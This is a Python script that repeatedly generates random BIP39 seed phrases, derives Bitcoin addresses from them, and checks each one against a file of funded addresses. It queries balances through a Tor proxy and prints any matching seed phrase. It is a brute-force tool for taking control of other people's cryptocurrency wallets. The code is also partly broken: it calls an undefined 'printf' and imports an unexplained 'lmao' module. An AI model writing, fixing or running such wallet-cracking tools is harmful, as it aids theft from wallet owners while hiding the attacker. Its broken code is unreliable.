import pprint
import binascii
import mnemonic
import bip32utils
import requests
import random
import os
from lmao import Bip39Gen
from decimal import Decimal
from multiprocessing.pool import ThreadPool as Pool
import threading
lock = threading.Lock()

dictionary = requests.get('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt').text.strip().split('\n')

address_file = open('btc_base58.txt', 'r')
address_lines = address_file.read()


proxies = {
    'http': 'socks5://127.0.0.1:9050',
    'https': 'socks5://127.0.0.1:9050',

}


def getBalance(addr):

    got_balance = False

    while not got_balance:
        try:
            response = requests.get(f'https://api.smartbit.com.au/v1/blockchain/address/{addr}', proxies=proxies)
            got_balance = True
            return (
                Decimal(response.json()["address"]["total"]["received"])
                / 100000000
            )
        except Exception as e:
            print(e)


def getBalance1(addr):

    if addr in address_lines:
        return Decimal(1)
    else:
        return Decimal(0)


#    with open("btc_base58.txt") as txt_file:
#        for line in txt_file:
#            if addr == line:
#                return 1
#            pass
#    txt_file.close()
#    return 0


def generateSeed():
    seed = ""
    for i in range(12):
        seed += random.choice(dictionary) if i == 0 else ' ' + random.choice(dictionary)
    return seed


def bip39(mnemonic_words):
    mobj = mnemonic.Mnemonic("english")
    seed = mobj.to_seed(mnemonic_words)

    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(
        44 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(0).ChildKey(0)

    return bip32_child_key_obj.Address()


def check():
    while True:
        mnemonic_words = Bip39Gen(dictionary).mnemonic
        addy = bip39(mnemonic_words)
        balance = getBalance1(addy)
        with lock:
            print(f'{addy} - {balance} - {mnemonic_words}')
        if balance > 0:
#            with open('ThanksTrails.txt', 'a') as w:
#                w.write(f'{addy} - {balance} - {mnemonic_words}\n')
            printf(f'found!!!')
            print(f'\a')
            os._exit(os.EX_OK)


def start():
    threads = 1
    pool = Pool(threads)
    for _ in range(threads):
        pool.apply_async(check, ())
    pool.close()
    pool.join()


if __name__ == '__main__':
    start()
